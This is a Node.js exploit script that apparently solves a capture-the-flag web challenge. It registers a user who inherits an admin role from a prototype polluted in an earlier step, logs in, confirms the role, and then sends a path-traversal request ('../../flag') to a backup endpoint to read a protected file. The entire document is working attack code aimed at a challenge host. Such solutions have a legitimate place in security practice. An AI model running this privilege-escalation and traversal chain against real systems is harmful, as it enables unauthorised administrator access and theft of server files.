
const http = require('http');
const querystring = require('querystring');

// Step 2: Register second user, inherits role=admin from poisoned prototype
const postData = querystring.stringify({
  "username": "secondadmin"
});

const opts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/register',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(postData)
  }
};

console.log("Step 2: Register second user...");
const req = http.request(opts, (res) => {
  let body = '';
  res.on('data', chunk => body += chunk);
  res.on('end', () => {
    console.log("Second user registered:");
    console.log(body);
    let match = body.match(/<span.*?>([a-f0-9]+)<\/span>/);
    if (match) {
      let uid = match[1];
      console.log(`\n✅ Got UID for second user: ${uid}`);
      console.log("Logging in...");
      loginAndCheck(uid);
    }
  });
});

req.on('error', err => console.error(err));
req.write(postData);
req.end();

function loginAndCheck(uid) {
  const querystring = require('querystring');
  const loginData = querystring.stringify({uid: uid});
  const loginOpts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/login',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(loginData)
    }
  };

  const req = http.request(loginOpts, (res) => {
    const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
    console.log("Logged in, checking profile...");
    const profileData = JSON.stringify({uid: uid});
    const profileOpts = {
      hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
      port: 80,
      path: '/api/profile',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(profileData),
        'Cookie': cookie
      }
    };

    const profileReq = http.request(profileOpts, (profileRes) => {
      let body = '';
      profileRes.on('data', chunk => body += chunk);
      profileRes.on('end', () => {
        console.log("\nProfile response:");
        console.log(body);
        try {
          const json = JSON.parse(body);
          console.log("\nRole is:", json.role);
          if (json.role === 'admin') {
            console.log("\n🎉 SUCCESS! Getting flag...");
            const flagData = querystring.stringify({file: '../../flag'});
            const flagOpts = {
              hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
              port: 80,
              path: '/api/backup',
              method: 'POST',
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(flagData),
                'Cookie': cookie
              }
            };
            const flagReq = http.request(flagOpts, (flagRes) => {
              let flagBody = '';
              flagRes.on('data', chunk => flagBody += chunk);
              flagRes.on('end', () => {
                console.log("\n🏁 FINAL FLAG:");
                console.log(flagBody);
              });
            });
            flagReq.write(flagData);
            flagReq.end();
          }
        } catch(e) {
          console.log("Error parsing JSON", e);
        }
      });
    });
    profileReq.write(profileData);
    profileReq.end();
  });

  req.on('error', err => console.error(err));
  req.write(loginData);
  req.end();
}
